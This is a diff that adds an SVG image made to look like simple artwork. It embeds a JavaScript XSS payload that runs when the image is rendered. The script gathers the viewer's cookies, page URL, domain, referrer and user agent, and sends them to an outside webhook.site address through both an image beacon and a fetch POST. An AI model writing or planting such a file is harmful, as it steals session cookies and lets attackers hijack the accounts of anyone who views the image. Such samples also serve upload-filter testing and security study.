@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200" viewBox="0 0 200 200">
+  <!-- 정상적인 아트워크처럼 보이게 하는 요소들 -->
+  <rect width="200" height="200" fill="#667eea" rx="10"/>
+  <circle cx="100" cy="100" r="60" fill="#764ba2"/>
+  <text x="100" y="110" text-anchor="middle" font-size="20" fill="white">ART</text>
+  
+  <!-- XSS 페이로드 -->
+  <script type="text/javascript">
+    <![CDATA[
+    // 쿠키와 추가 정보 수집
+    var cookies = document.cookie;
+    var currentUrl = window.location.href;
+    var domain = document.domain;
+    
+    // webhook으로 데이터 전송 (이미지 방식)
+    var img = new Image();
+    img.src = 'https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e?source=svg_xss&cookies=' + 
+              encodeURIComponent(cookies) + 
+              '&url=' + encodeURIComponent(currentUrl) + 
+              '&domain=' + encodeURIComponent(domain) +
+              '&timestamp=' + Date.now();
+    
+    // fetch로도 더 자세한 정보 전송
+    var payload = {
+      attack_vector: 'SVG_FILE_XSS',
+      cookies: cookies,
+      url: currentUrl,
+      domain: domain,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    };
+    
+    fetch('https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload)
+    }).catch(e => {
+      console.log('Fetch failed, but image beacon should work');
+    });
+    ]]>
+  </script>
+</svg>
